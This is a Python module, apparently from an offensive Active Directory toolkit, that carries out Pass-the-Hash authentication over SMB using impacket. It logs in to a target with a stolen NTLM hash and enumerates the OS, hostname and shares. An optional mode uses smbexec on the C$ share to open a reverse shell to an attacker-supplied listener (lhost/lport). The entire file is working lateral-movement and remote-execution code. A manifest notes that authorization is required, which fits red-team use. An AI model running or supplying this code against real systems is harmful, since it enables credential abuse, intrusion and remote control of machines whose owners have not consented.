"""Pass-the-Hash -- authenticate with NTLM hash via SMB/WMI.

Supports --shell for interactive shell after successful PtH authentication.
"""


import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.lateral.pth.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["smb_authentication", "remote_command_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1550.002"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)

    if not cred.has_hash:
        print("[!] Pass-the-Hash requires --hashes LM:NT", file=sys.stderr)
        return 1

    shell_mode = getattr(args, "shell", False)
    print("[*] Pass-the-Hash → {} ({}\\{}){}".format(
        args.target, args.domain, cred.username,
        " [interactive shell]" if shell_mode else ""))

    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        smb = SMBConnection(args.target, args.target, sess_port=445)
        smb.login(cred.username, "", args.domain, cred.lm_hash, cred.nt_hash)
        print(f"[+] SMB authentication successful as {args.domain}\\{cred.username}")
        print(f"    OS: {smb.getServerOS()}")
        print(f"    Hostname: {smb.getServerName()}")

        shares = smb.listShares()
        print("    Shares: {}".format(
            ", ".join(s["shi1_netname"].rstrip(chr(0)) for s in shares)))

        smb.logoff()
    except Exception as exc:
        print(f"[-] PtH failed: {exc}", file=sys.stderr)
        return 1

    if shell_mode:
        lhost = getattr(args, "lhost", None)
        lport = int(getattr(args, "lport", 4444))
        shell_type = getattr(args, "shell_type", "powershell")

        if not lhost:
            print("[!] --shell requires --lhost", file=sys.stderr)
            return 1

        print("[*] PtH auth OK, spawning shell via smbexec...")
        from adxpl.core.shell_mixin import spawn_ad_shell

        try:
            from impacket.examples.smbexec import CMDEXEC
        except ImportError:
            print("[!] impacket smbexec not available", file=sys.stderr)
            return 1

        def _exec_payload(payload: str) -> None:
            executer = CMDEXEC(
                payload,
                username=cred.username, password="",
                domain=args.domain,
                hashes=cred.impacket_hash,
                share="C$", mode="SHARE",
            )
            executer.run(args.target)

        ok = spawn_ad_shell(
            target=args.target, lhost=lhost, lport=lport,
            shell_type=shell_type, execute_fn=_exec_payload,
        )
        return 0 if ok else 1

    return 0
